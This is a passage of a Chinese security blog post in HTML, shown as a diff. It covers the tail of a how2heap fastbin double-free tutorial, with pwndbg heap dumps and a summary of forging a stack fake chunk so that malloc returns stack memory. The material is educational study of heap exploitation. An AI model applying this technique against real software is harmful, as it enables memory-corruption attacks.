class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x603000,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x21<br>&#125;<br><span class="hljs-number">0</span>x603040 FASTBIN &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">33</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x20fa1<br>&#125;<br><span class="hljs-number">0</span>x603060 PREV_INUSE &#123;<br>  <span class="hljs-attr">prev_size</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>,<br>  <span class="hljs-attr">size</span> <span class="hljs-operator">=</span> <span class="hljs-number">135073</span>,<br>  <span class="hljs-attr">fd</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">fd_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0,<br>  <span class="hljs-attr">bk_nextsize</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>x0<br>&#125;<br>pwndbg<span class="hljs-operator">&gt;</span> bins<br>fastbins<br><span class="hljs-number">0</span><span class="hljs-params">x20:</span> <span class="hljs-number">0</span>x603000 —▸ <span class="hljs-number">0</span>x603020 ◂— <span class="hljs-number">0</span>x603000<br><span class="hljs-number">0</span><span class="hljs-params">x30:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x40:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x50:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x60:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x70:</span> <span class="hljs-number">0</span>x0<br><span class="hljs-number">0</span><span class="hljs-params">x80:</span> <span class="hljs-number">0</span>x0<br>unsortedbin<br><span class="hljs-params">all:</span> <span class="hljs-number">0</span>x0<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg<span class="hljs-operator">&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到这个时候我们已经有了一个free的回环链</p>
+<p>程序继续运行,d已经赋完了值,我们可以看到他的fb指针已经是stack_var的地址了</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs dns">pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0x603000</span><br><span class="hljs-number">0x603000</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x603010</span>:       <span class="hljs-number">0</span>x00007fffffffe5f8      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603020</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br><span class="hljs-number">0x603030</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000603000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span><br><span class="hljs-number">0x603040</span>:       <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000000</span>      <span class="hljs-number">0</span>x00000<span class="hljs-number">00000000021</span><br></code></pre></td></tr></table></figure>
+
+<p>这个时候我们看看bins</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">pwndbg</span>&gt; bins<br><span class="hljs-attribute">fastbins</span><br><span class="hljs-attribute">0x20</span>: <span class="hljs-number">0</span>x603000 —▸ <span class="hljs-number">0</span>x7fffffffe5f8 —▸ <span class="hljs-number">0</span>x603010 ◂— <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x30</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x40</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x50</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x60</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x70</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">0x80</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">unsortedbin</span><br><span class="hljs-attribute">all</span>: <span class="hljs-number">0</span>x0<br><span class="hljs-attribute">smallbins</span><br><span class="hljs-attribute">empty</span><br><span class="hljs-attribute">largebins</span><br><span class="hljs-attribute">empty</span><br></code></pre></td></tr></table></figure>
+
+<p>可以看到free list中已经有了栈指针,那么这个时候我们再分配就可以分配到栈的内存空间了</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">pwndbg&gt; heap<br><span class="hljs-number">0x603000</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x7fffffffe5f8</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x603020</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x603000</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x21</span><br>&#125;<br><span class="hljs-number">0x603040</span> FASTBIN &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">33</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x20fa1</span><br>&#125;<br><span class="hljs-number">0x603060</span> PREV_INUSE &#123;<br>  prev_size = <span class="hljs-number">0</span>,<br>  size = <span class="hljs-number">135073</span>,<br>  fd = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk </span>= <span class="hljs-number">0x0</span>,<br>  fd_nextsize = <span class="hljs-number">0x0</span>,<br>  <span class="hljs-keyword">bk_nextsize </span>= <span class="hljs-number">0x0</span><br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h2 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h2><p>程序先在栈上定义了一个变量stack_var</p>
+<p>之后malloc了三个chunk a,b,c</p>
+<p>之后做了一个double free,形成了一个a-&gt;b-&gt;a的free链</p>
+<p>此时再次malloc了一个大小一样的chunk d,这个时候chunk d会拿出chunk a</p>
+<p>之后我们又申请了一个一样大小的chunk出来拿出了b,这个时候链上就只剩下一个a了</p>
+<p>此时我们伪造了stack_var,把他伪装成了一个free chunk,并且赋值给了chunk d,也就是chunk a,此时fd指针被伪造成了fake chunk,形成了一个新的free链</p>
+<p>最后再申请内存的时候,我们就取出了栈上的内存</p>
+<p>如上</p>
+<p>文章首发于安全客，转载请著名出处，文章链接<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197437">https://www.anquanke.com/post/id/197437</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/pwning-is-an-art/" class="print-no-link">#pwning is an art</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>how2heap总结计划一</div>
+      <div>https://nightrainy.github.io/2020/01/18/how2heap总结计划一/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>知世</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2020年1月18日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="NC - 非商业性使用">
+                    <i class="iconfont icon-cc-nc"></i>
+                  </span>
+                </a>
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="ND - 禁止演绎">
+                    <i class="iconfont icon-cc-nd"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2020/01/19/how2heap%E6%80%BB%E7%BB%93%E8%AE%A1%E5%88%92%E4%BA%8C/" title="how2heap总结计划二">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">how2heap总结计划二</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2020/01/07/pwn%E7%8E%AF%E5%A2%83docker%E5%8C%96/" title="pwn环境docker化">
+                        <span class="hidden-mobile">pwn环境docker化</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
